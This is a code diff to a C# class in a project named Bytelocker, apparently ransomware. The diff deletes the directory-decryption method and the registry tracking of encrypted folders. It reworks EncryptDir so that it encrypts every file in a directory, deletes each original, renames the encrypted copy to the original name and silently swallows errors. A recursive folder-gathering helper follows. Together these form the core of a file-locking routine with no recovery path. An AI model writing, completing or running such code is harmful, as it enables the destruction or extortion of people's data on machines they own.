@@ -17,69 +17,33 @@ namespace Bytelocker.CryptoManager
             this.dir_path = dir_path;
         }
 
-        public void DecryptDir()
-        {
-            RegistryManager rm = new RegistryManager();
-            FileManager fm = new FileManager();
-
-            if ((rm.ReadBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path)))
-            {
-                try
-                {
-                    String[] dir_files = Directory.GetFiles(this.dir_path);
-
-                    foreach (String file_path in dir_files)
-                    {
-                        fm.ChooseFile(file_path);
-                        fm.SetupFileEncrypter();
-                        if (fm.DecryptFile())
-                        {
-                            fm.DeleteFile();
-                        }
-                    }
-
-                    rm.DeleteValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path);
-
-                }
-                catch (Exception)
-                {
-                }
-
-            }
-        }
-
         public void EncryptDir()
         {
-            RegistryManager rm = new RegistryManager();
             FileManager fm = new FileManager();
 
-            if (!(rm.ReadBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path)))
+            try
             {
-                try
-                {
-                    String[] dir_files = Directory.GetFiles(this.dir_path);
+                String[] dir_files = Directory.GetFiles(this.dir_path);
 
-                    foreach (String file_path in dir_files)
+                foreach (String file_path in dir_files)
+                {
+                    fm.ChooseFile(file_path);
+                    fm.SetupFileEncrypter();
+                    if (fm.EncryptFile())
                     {
-                        fm.ChooseFile(file_path);
-                        fm.SetupFileEncrypter();
-                        if (fm.EncryptFile())
-                        {
-                            fm.DeleteFile();
-                        }
+                        fm.DeleteFile();
+                        fm.RenameTmpFileToOrig();
                     }
+                }
 
-                    rm.CreateBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path, true);
-                }
-                catch (System.UnauthorizedAccessException)
-                {
-                    // if folder cannot be accessed
-                }
-                catch (Exception)
-                {
-                }
             }
-
+            catch (System.UnauthorizedAccessException)
+            {
+                // if folder cannot be accessed
+            }
+            catch (Exception)
+            {
+            }
         }
 
         public static List<String> GetFoldersRecursive(String initDir)
